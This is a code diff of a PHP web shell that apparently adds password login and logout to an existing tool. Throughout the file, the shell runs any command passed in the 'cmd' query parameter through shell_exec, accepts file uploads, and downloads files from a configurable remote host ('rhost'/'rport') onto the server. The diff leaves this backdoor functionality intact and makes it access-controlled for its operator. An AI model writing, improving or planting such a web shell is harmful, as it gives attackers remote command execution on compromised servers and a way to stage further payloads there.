@@ -1,15 +1,20 @@
 <?php
-	$_SESSION['valid'] = false;
-	login();
-	
+session_start();
+	if (($_SESSION['valid'] === null or $_SESSION['logged_in'] === false) or (!array_key_exists('valid', $_SESSION) or $_SESSION['valid'] !== true)) {
+		login();
+	} else {
+		displayForm();
+	}
+
 	function displayForm() {
 		if (!$_SESSION['valid']) {
-			exit();
+			abortProgram();
 		}
 
 		$output = ""; # Leave this blank
-		$host = "127.0.0.1"; # host to fetch files from if not a local upload
-		$port = "9001"; 
+		# Remote host details
+		$rhost = "127.0.0.1";
+		$rport = "9001"; 
 
 		if (isset($_FILES['fileToUpload'])) {
 			$output = "";
@@ -20,15 +25,26 @@
 
 		if (isset($_POST['remoteFile'])) {
 			$output = "";
-      file_put_contents($_POST['remoteFile'], file_get_contents("http://$host:$port/" . $_POST['remoteFile']));
+      file_put_contents($_POST['remoteFile'], file_get_contents("http://$rhost:$rport/" . $_POST['remoteFile']));
     }
     if (isset($_GET['cmd'])) {
-      $output .= "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+			$output .= "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
 		}
-		
+
+		if (isset($_POST['logout'])) {
+			logout();
+			header("Refresh:0");
+		}
+
 		echo <<<HTML
 			<html>
 				<body>
+
+					<form method="POST">
+						<p> <input type="submit" value="Logout" name="logout">
+					</form>
+
+				<br>
 					<form action="" method="POST" enctype="multipart/form-data">
 						<input type="hidden" name="MAX_FILE_SIZE" value="1000000">
 						<p> Local Upload: <input type="file" name="fileToUpload">
@@ -54,31 +70,29 @@
 			</body>
 		</html>
 HTML;
-	}
+}
 
 	function login() {
-		$output = "";
-		# Ensure these credentials are set
+		$output = "<pre>"  . "Username and password required. Ensure creds have been added to source." . "</pre>";
 		$masterUser = "";
 		$masterPassword = "";
-		
-		# Exit if master creds are not set
-		if ($masterUser === "" or $masterPassword === "") {
-			$output .= "<pre>"  . "Master credentials cannot be blank. Edit source" . "</pre>";
-			exit();
-		}
 
 		if (isset($_POST['username']) and isset($_POST['password'])) {
+			if ($masterUser === "" or $masterPassword === "") {
+				abortProgram();
+			}
+
 			if ($_POST['username'] === $masterUser and $_POST['password'] === $masterPassword) {
 				$_SESSION['valid'] = true;
-        $_SESSION['timeout'] = time();
+				$_SESSION['logged_in'] = true;
+				$_SESSION['timeout'] = time();
 				displayForm();
 			} else {
-				$output .= "<pre>"  . "Invalid credentials" . "</pre>";
+				$output = "<pre>"  . "Invalid credentials" . "</pre>";
 			}
-		} else {
-			$output .= "<pre>"  . "Username and password required" . "</pre>";
 		}
+
+	if($_SESSION['valid'] !== true) {
 		echo <<<HTML
 		<html>
 				<body>
@@ -94,9 +108,23 @@ HTML;
 	 </html>
 HTML;
 	}
+	}
+
+	function abortProgram() {
+		echo <<<HTML
+		<html>
+				<body>
+					<pre> No password set. Access Denied. Aborting. </pre>
+			 	</body>
+	 </html>
+HTML;
+		exit();
+	}
 	
 	function logout() {
-		return 0;
+		unset($_SESSION['valid']);
+		unset($_SESSION['logged_in']);
+		session_destroy();
 	}
 
 ?>
